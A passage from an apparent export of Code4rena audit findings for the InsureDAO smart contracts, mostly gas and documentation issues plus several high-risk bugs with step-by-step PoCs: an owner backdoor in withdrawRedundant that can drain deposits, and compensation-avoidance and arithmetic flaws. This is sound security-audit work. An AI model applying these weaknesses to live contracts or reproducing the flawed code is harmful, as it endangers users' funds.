division here: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L306   "}, {"title": "Repeated math operations", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/308", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Can be refactored, from this: ```solidity   require(       request.timestamp +           parameters.getLockup(msg.sender) <           block.timestamp,       \"ERROR: WITHDRAWAL_QUEUE\"   );   require(       request.timestamp +           parameters.getLockup(msg.sender) +           parameters.getWithdrawable(msg.sender) >           block.timestamp,       \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"   ); ``` to this: ```solidity   uint256 unlocksAt = request.timestamp + parameters.getLockup(msg.sender);   require(       unlocksAt < block.timestamp,       \"ERROR: WITHDRAWAL_QUEUE\"   );   require(       unlocksAt + parameters.getWithdrawable(msg.sender) > block.timestamp,       \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"   ); ```  There are more places where this optimization could be applied besides the provided example, but the basic idea is to cache the result of repeated math operation when the value does not change.  "}, {"title": "repayDebt optimization", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/307", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function repayDebt could be refactored to reduce deployment and operational costs from this: ```solidity   uint256 _debt = debts[_target];   if (_debt >= _amount) {       debts[_target] -= _amount;       totalDebt -= _amount;       IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);   } else {       debts[_target] = 0;       totalDebt -= _debt;       IERC20(token).safeTransferFrom(msg.sender, address(this), _debt);   } ``` to this: ```solidity   uint256 _debt = debts[_target];   if (_debt > _amount) {       debts[_target] = _debt - _amount;   } else {       debts[_target] = 0;       _amount = _debt;   }   totalDebt -= _amount;   IERC20(token).safeTransferFrom(msg.sender, address(this), _amount); ```  "}, {"title": "Repeated storage reads", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/306", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Repeated storage read should be cached, e.g. attributions[_target] is read from storage twice: ```solidity         if (attributions[_target] > 0) {             return (valueAll() * attributions[_target]) / totalAttributions; ``` totalAttributions read twice: ```solidity         if (totalAttributions > 0 && _attribution > 0) {             return (_attribution * valueAll()) / totalAttributions; ``` available() called twice: ```solidity         if (available() < _retVal) {             uint256 _shortage = _retVal - available(); ``` would be cheaper to use _token from memory here: ```solidity     IERC20(token).safeTransfer(_to, _redundant); ```  There are more places where this optimization could be applied besides the provided examples, but the basic idea is to cache storage variables if you need to access them multiple times when the value does not change.  "}, {"title": "Repeated external calls", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/304", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Avoid repeated external calls, e.g. here token balanceOf is queried 4 times: ```solidity if (     ...     balance < IERC20(token).balanceOf(address(this)) ) {     uint256 _redundant = IERC20(token).balanceOf(address(this)) - balance;     ... } else if (IERC20(_token).balanceOf(address(this)) > 0) {     IERC20(_token).safeTransfer(         _to,         IERC20(_token).balanceOf(address(this))     ); } ``` You should query it only once and then use the cached value as it doesn't change between the statements.  "}, {"title": "Eliminate else block", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/303", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact You dont need this else block, code can be refactored from this: ```solidity   if (address(controller) != address(0)) {       controller.migrate(address(_controller));       controller = IController(_controller);   } else {       controller = IController(_controller);   } ``` to this: ```solidity   if (address(controller) != address(0)) {       controller.migrate(address(_controller));   }   controller = IController(_controller); ```  "}, {"title": "Gas: Cache `totalLiquidity()` in `IndexTemplate:leverage()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact SLOADs are expensive  ## Proof of Concept Here, `totalLiquidity()` is loaded twice from storage ``` 491:     function leverage() public view returns (uint256 _rate) { 492:         //check current leverage rate 493:         if (totalLiquidity() > 0) { 494:             return (totalAllocatedCredit * MAGIC_SCALE_1E6) / totalLiquidity(); 495:         } else { 496:             return 0; 497:         } 498:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache `totalLiquidity()` in a variable  "}, {"title": "Gas: Optimize Conditional Statements in `IndexTemplate.sol:deposit()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/300", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact It's possible to save gas by optimizing the checks in conditional statements (`if`, `else if` and `else`). This would save a few opcodes and avoid redundant checks.  ## Proof of Concept In `IndexTemplate.sol:deposit()`, the code is as follows: ``` 172:         if (_supply > 0 && _totalLiquidity > 0) {   173:             _mintAmount = (_amount * _supply) / _totalLiquidity; 174:         } else if (_supply > 0 && _totalLiquidity == 0) { 175:             //when 176:             _mintAmount = _amount * _supply; 177:         } else { 178:             _mintAmount = _amount; 179:         } ```  The conditions checks can be optimized with the following (read the `@audit-info` comments for further information): ```       if (_supply == 0) {           _mintAmount = _amount;       } else if (_totalLiquidity == 0) { // @audit-info : implicit _supply > 0 as above condition is false           _mintAmount = _amount * _supply;       } else { // @audit-info : implicit _supply > 0 and _totalLiquidity > 0 as both the previous conditions are false           _mintAmount = (_amount * _supply) / _totalLiquidity;       } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Compact conditions in mentioned logic statements   "}, {"title": "`Factory:approveTemplate` could make 1 SSTORE instead of 3", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/298", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost as SSTOREs are very expensive  ## Proof of Concept The code is as follows : ``` 094:     function approveTemplate( 095:         IUniversalMarket _template, 096:         bool _approval, 097:         bool _isOpen, 098:         bool _duplicate 099:     ) external override onlyOwner { 100:         require(address(_template) != address(0)); 101:         templates[address(_template)].approval = _approval; //@audit-info SSTORE 102:         templates[address(_template)].isOpen = _isOpen; //@audit-info SSTORE 103:         templates[address(_template)].allowDuplicate = _duplicate; //@audit-info SSTORE 104:         emit TemplateApproval(_template, _approval, _isOpen, _duplicate); 105:     } ``` As we can see, it's making 3 SSTORE operations, one for each boolean. The code could be optimized as follows to save gas : ```     function approveTemplate(         IUniversalMarket _template,         bool _approval,         bool _isOpen,         bool _duplicate     ) external override onlyOwner {         require(address(_template) != address(0));         Template memory approvedTemplate = new Template(_isOpen, _approval, _duplicate);         templates[address(_template)] = approvedTemplate; //@audit-info only one SSTORE         emit TemplateApproval(_template, _approval, _isOpen, _duplicate);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use a memory `Template ` struct and write in storage only once  "}, {"title": "Spec error on function: `Factory:setCondition` (difference with code comment)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/297", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  The spec says the function should be called `approveCondition()` instead of `setCondition`: https://insuredao.gitbook.io/developers/market/factory#approvecondition  While this might still be understood nonetheless as `setCondition` is also mentioned, the spec says that the parameter `_slot` is the `index of the reference array`, whereas the code comment says it's the `index within condition array`: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L133  ## Tools Used VS Code  ## Recommended Mitigation Steps My guess is that the spec should be corrected  "}, {"title": "Spec error on function: `Factory:approveTemplate`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/296", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  The spec doesn't match with the comments in the code here:   Code: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L90-L91 Spec: https://insuredao.gitbook.io/developers/market/factory#approvetemplate  Here, the spec doesn't mention `_isOpen` and seem to confuse the `_approval` description with what `_isOpen` should be.  ## Tools Used VS Code  ## Recommended Mitigation Steps My guess is that the spec should be corrected  "}, {"title": "Inconsistent divide by 0 checks for `totalSupply()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/287", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact A division by 0 could occur  ## Proof of Concept While at some places, a check is made to make sure that `totalSupply() > 0`, it's not consistently the case, such as in the following places:  ``` contracts\\CDSTemplate.sol:235:        _retVal = (vault.attributionValue(crowdPool) * _amount) / totalSupply(); contracts\\CDSTemplate.sol:318:                _balance * vault.attributionValue(crowdPool) / totalSupply(); contracts\\IndexTemplate.sol:216:        _retVal = (_liquidty * _amount) / totalSupply(); contracts\\IndexTemplate.sol:530:            return (_balance * totalLiquidity()) / totalSupply(); contracts\\PoolTemplate.sol:768:            return (_balance * originalLiquidity()) / totalSupply(); ```  At the following places, the check is indeed made: ``` contracts\\IndexTemplate.sol:514:            return (totalLiquidity() * MAGIC_SCALE_1E6) / totalSupply(); contracts\\PoolTemplate.sol:747:            return (originalLiquidity() * MAGIC_SCALE_1E6) / totalSupply(); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps If this check is at least made at some places, this means that `totalSupply()` can indeed take a value of 0. Therefore, a check should always be made to prevent the div by 0  "}, {"title": "Gas: Optimize Conditional Statements in `CDSTemplate.sol:deposit()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/285", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact It's possible to save gas by optimizing the checks in conditional statements (`if`, `else if` and `else`). This would save a few opcodes and avoid redundant checks.  ## Proof of Concept In `CDSTemplate.sol:deposit()`, the code is as follows: ``` 140:         if (_supply > 0 && _liquidity > 0) {  141:             _mintAmount = (_amount * _supply) / _liquidity; 142:         } else if (_supply > 0 && _liquidity == 0) { 143:             //when vault lose all underwritten asset =  144:             _mintAmount = _amount * _supply; //dilute LP token value af. Start CDS again. 145:         } else { 146:             //when _supply == 0, 147:             _mintAmount = _amount; 148:         } ```  The conditions checks can be optimized with the following (read the `@audit-info` comments for futher information): ```         if (_supply == 0) {              _mintAmount = _amount;         } else if (_liquidity == 0) { // @audit-info : implicit _supply > 0 as above condition is false             //when vault lose all underwritten asset =              _mintAmount = _amount * _supply; //dilute LP token value af. Start CDS again.         } else { // @audit-info : implicit _supply > 0 and _liquidity > 0 as both the previous conditions are false             _mintAmount = (_amount * _supply) / _liquidity;         } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Compact conditions in mentioned logic statements  "}, {"title": "Wrong comment on fund function", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/284", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact In the https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L157 it is the descriptionof the depoist function, and not the correct description for the fund function.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L156-L173    "}, {"title": "[WP-H39] `PoolTemplate.sol#resume()` Wrong implementation of `resume()` will compensate overmuch redeem amount from index pools", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/283", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  ## Root Cause  Wrong arithmetic.  ---  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717  ```solidity uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /             totalLiquidity();     uint256 _actualDeduction;     for (uint256 i = 0; i < indexList.length; i++) {         address _index = indexList[i];         uint256 _credit = indicies[_index].credit;         if (_credit > 0) {             uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /                 _totalCredit;             uint256 _redeemAmount = _divCeil(                 _deductionFromIndex,                 _shareOfIndex             );             _actualDeduction += IIndexTemplate(_index).compensate(                 _redeemAmount             );         }     } ```   ### PoC  - totalLiquidity = 200,000* 10**18; - totalCredit = 100,000 * 10**18; - debt = 10,000 * 10**18;  - [Index Pool 1] Credit = 20,000 * 10**18; - [Index Pool 2] Credit = 30,000 * 10**18;  ``` uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /             totalLiquidity(); // _deductionFromIndex = 10,000 * 10**6 * 10**18;  ```  [Index Pool 1]:  ``` uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;   //  _shareOfIndex = 200000  uint256 _redeemAmount = _divCeil(     _deductionFromIndex,     _shareOfIndex );  // _redeemAmount = 25,000 * 10**18; ```  [Index Pool 2]:  ``` uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;   //  _shareOfIndex = 300000  uint256 _redeemAmount = _divCeil(     _deductionFromIndex,     _shareOfIndex );  // _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18) ```  In most cases, the transaction will revet on underflow at: ``` uint256 _shortage = _deductionFromIndex /             MAGIC_SCALE_1E6 -             _actualDeduction; ```  In some cases, specific pools will be liable for unfair compensation:  If the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.   `Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.  ### Recommendation  Change to:  ```solidity uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity(); uint256 _actualDeduction; for (uint256 i = 0; i < indexList.length; i++) {     address _index = indexList[i];     uint256 _credit = indicies[_index].credit;     if (_credit > 0) {         uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /             _totalCredit;         uint256 _redeemAmount = _divCeil(             _deductionFromIndex * _shareOfIndex,             MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6         );         _actualDeduction += IIndexTemplate(_index).compensate(             _redeemAmount         );     } } ```  "}, {"title": "[WP-G37] Change `public` constant variables to `private` / `internal` can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L146-L146  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L95-L95  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```   https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L55-L55  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```   https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L38-L38  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```  For the constants that should not be `public`, changing them to `private` / `internal` can save some gas. To avoid unnecessary getter functions.  "}, {"title": "[WP-H36] Admin of the index pool can `withdrawCredit()` after `applyCover()` to avoid taking loss for the compensation paid for a certain pool", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/281", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.  This allows the index pool to escape from the responsibility for the risks of invested pools.  Making the LPs of the pool take an unfair share of the responsibility.  ### PoC  - Pool A `totalCredit` = 10,000 - Pool A `rewardPerCredit` = 1  1. [Index Pool 1] allocates 1,000 credits to Pool `A`:  - `totalCredit` = 11,000 - indicies[Index Pool 1] = 1,000  2. After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, [Index Pool 1] call `withdrawCredit()` get 100 premium  - `totalCredit` = 10,000 - indicies[Index Pool 1] = 0  3. After `pendingEnd`, the pool `resume()`,[ Index Pool 1] will not be paying for the compensation since `credit` is 0.  In our case, [Index Pool 1] earned premium without paying for a part of the compensation.  ### Recommendation  Change to:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421  ```solidity     function withdrawCredit(uint256 _credit)         external         override         returns (uint256 _pending)     {         require(             marketStatus == MarketStatus.Trading,             \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"         );         IndexInfo storage _index = indicies[msg.sender]; ```  "}, {"title": "[WP-L28] `Vault#_unutilize()` Lack of validation for the amount of funds received", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/270", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L429-L434  ```solidity function _unutilize(uint256 _amount) internal {     require(address(controller) != address(0), \"ERROR_CONTROLLER_NOT_SET\");      controller.withdraw(address(this), _amount);     balance += _amount; } ```  ### Recommendation  Can be changed to:  ```solidity function _unutilize(uint256 _amount) internal {     require(address(controller) != address(0), \"ERROR_CONTROLLER_NOT_SET\");      uint256 beforeBalance = IERC20(token).balanceOf(address(this));     controller.withdraw(address(this), _amount);     uint256 received = IERC20(token).balanceOf(address(this)) - beforeBalance;     require(received >= _amount, \"...\");     balance += received; } ```   "}, {"title": "[WP-H27] `IndexTemplate.sol#compensate()` will most certainly fail", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/269", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  ## Root Cause  Precision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.  ---  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447  ```solidity uint256 _shortage; if (totalLiquidity() < _amount) {     //Insolvency case     _shortage = _amount - _value;     uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))         .compensate(_shortage);     _compensated = _value + _cds; } vault.offsetDebt(_compensated, msg.sender); ```  In the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.  However, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.  Due to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.  At L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.  At L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.  As a result, `resume()` can not be done, and the debt can't be repaid.  ### PoC   Given:  - vault.underlyingValue = 10,000 - vault.valueAll = 30,000 - totalAttributions = 2,000,000 - _amount = 1,010,000  0. _shortage = _amount - vault.underlyingValue = 1,000,000 1. _attributions = (_amount * totalAttributions) / valueAll = 67,333,333 2. actualValueTransfered = (valueAll * _attributions) / totalAttributions = 1009999  **Expected results**: actualValueTransfered = _shortage;  **Actual results**: actualValueTransfered < _shortage.  ## Impact  The precision loss isn't just happening on special numbers, but will most certainly always revert the txs.  This will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.  ## Recommendation  Change to:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446  ```solidity if (totalLiquidity() < _amount) {     //Insolvency case     _shortage = _amount - _value;     uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))         .compensate(_shortage);     _compensated = vault.underlyingValue(address(this)); } vault.offsetDebt(_compensated, msg.sender); ```  "}, {"title": "[WP-L26] `Vault#setController()` Lack of validation for the amount of migrated funds", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/268", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496  ```solidity function setController(address _controller) public override onlyOwner {     require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");      if (address(controller) != address(0)) {         controller.migrate(address(_controller));         controller = IController(_controller);     } else {         controller = IController(_controller);     }      emit ControllerSet(_controller); } ```  `controller.migrate()` is a critical operation, we recommend adding validation for the amount of migrated funds.  ### Recommendation  Can be changed to:  ```solidity function setController(address _controller) public override onlyOwner {     require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");      if (address(controller) != address(0)) {         uint256 beforeUnderlying = controller.valueAll();         controller.migrate(address(_controller));         require(IController(_controller).valueAll() >= beforeUnderlying, \"...\");         controller = IController(_controller);     } else {         controller = IController(_controller);     }      emit ControllerSet(_controller); } ```  "}, {"title": "[WP-G23] Avoiding unnecessary storage read can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/265", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Ownership.sol#L17-L20  ```solidity constructor() {     _owner = msg.sender;     emit AcceptNewOwnership(_owner); } ```  At L19, the parameter of `AcceptNewOwnership` can use `msg.sender` directly to avoid unnecessary storage read of `_owner` to save some gas.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Ownership.sol#L65-L71  ```solidity function acceptTransferOwnership() external override onlyFutureOwner {     /***         *@notice Accept a transfer of ownership         */     _owner = _futureOwner;     emit AcceptNewOwnership(_owner); } ```  At L69, `_futureOwner` can use `msg.sender` directly to avoid unnecessary storage read of `_futureOwner` to save some gas.  As `onlyFutureOwner()` ensures that `require(_futureOwner == msg.sender, \"...\");`.  "}, {"title": "[WP-G21] Cache external call results can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/264", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Every call to an external contract costs a decent amount of gas. For optimization of gas usage, external call results should be cached if they are being used for more than one time.  For example:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L153-L158  ```solidity require(     attributions[msg.sender] > 0 &&         underlyingValue(msg.sender) >= _amount,     \"ERROR_WITHDRAW-VALUE_BADCONDITOONS\" ); _attributions = (totalAttributions * _amount) / valueAll(); ```  In `Vault#withdrawValue()`, `controller.valueAll()` is called twice:  1. L155 `underlyingValue(msg.sender)` -> `valueAll()` -> `controller.valueAll()`; 1. L158 `valueAll()` ->  `controller.valueAll()`.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L400-L411  ```solidity function underlyingValue(address _target)     public     view     override     returns (uint256) {     if (attributions[_target] > 0) {         return (valueAll() * attributions[_target]) / totalAttributions;     } else {         return 0;     } } ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L417-L423  ```solidity function valueAll() public view returns (uint256) {     if (address(controller) != address(0)) {         return balance + controller.valueAll();     } else {         return balance;     } } ```  "}, {"title": "PoolTemplate.availableBalance calls totalLiquidity twice", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/262", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on the function call  ## Proof of Concept  availableBalance calls totalLiquidity() twice:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L835  ## Recommended Mitigation Steps  Save the call result to memory and use it  "}, {"title": "Keeper, not controller: Vault.setKeeper and utilize descriptions are incorrect", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/259", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details    ## Impact  `setKeeper` / `utilize` descriptions state that it is controller who is set / can run utilize, while keeper and controller are two separate roles, which don't have to coincide.  I.e. the descriptions now mix up the roles and are confusing this way.  ## Proof of Concept  setKeeper:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L499   utilize:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L339   ## Recommended Mitigation Steps  Update the descriptions to relate to the `keeper` role.   "}, {"title": "Struct layout", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/253", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Insurance struct in `PoolTemplate .sol` can be optimized to reduce 2 storage slot  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L127-L128 ``` struct Insurance {         uint256 id; //each insuance has their own id         uint256 startTime; //timestamp of starttime         uint256 endTime; //timestamp of endtime         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         address insured; //the address holds the right to get insured         bool status; //true if insurance is not expired or redeemed     } ``` `startTime` and `endTime `store block numbers, and 2^48 is being enough for a very long time. ## Tools Used https://docs.soliditylang.org/en/v0.8.0/internals/layout_in_storage.html?highlight=Structs#layout-of-state-variables-in-storage   ## Recommended Mitigation Steps The struct can be changed into: ``` struct Insurance {         uint256 id; //each insuance has their own id         uint48 startTime; //timestamp of starttime         uint48 endTime; //timestamp of endtime         address insured; //the address holds the right to get insured         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         bool status; //true if insurance is not expired or redeemed     } ```   "}, {"title": "backdoor in `withdrawRedundant`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/252", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.  ```solidity function withdrawRedundant(address _token, address _to)      external      override      onlyOwner {      if (           _token == address(token) &&           balance < IERC20(token).balanceOf(address(this))      ) {           uint256 _redundant = IERC20(token).balanceOf(address(this)) -                balance;           IERC20(token).safeTransfer(_to, _redundant);      } else if (IERC20(_token).balanceOf(address(this)) > 0) {           // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything           IERC20(_token).safeTransfer(                _to,                IERC20(_token).balanceOf(address(this))           );      } } ```  #### POC - Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)` - Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.  ## Impact There's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.  ## Recommended Mitigation Steps I think the devs wanted this logic from the code instead:  ```solidity function withdrawRedundant(address _token, address _to)      external      override      onlyOwner {      if (           _token == address(token)      ) {           if (balance < IERC20(token).balanceOf(address(this))) {                uint256 _redundant = IERC20(token).balanceOf(address(this)) -                     balance;                IERC20(token).safeTransfer(_to, _redundant);           }      } else if (IERC20(_token).balanceOf(address(this)) > 0) {           IERC20(_token).safeTransfer(                _to,                IERC20(_token).balanceOf(address(this))           );      } } ```   "}, {"title": "Initial pool deposit can be stolen", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/250", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  Note that the 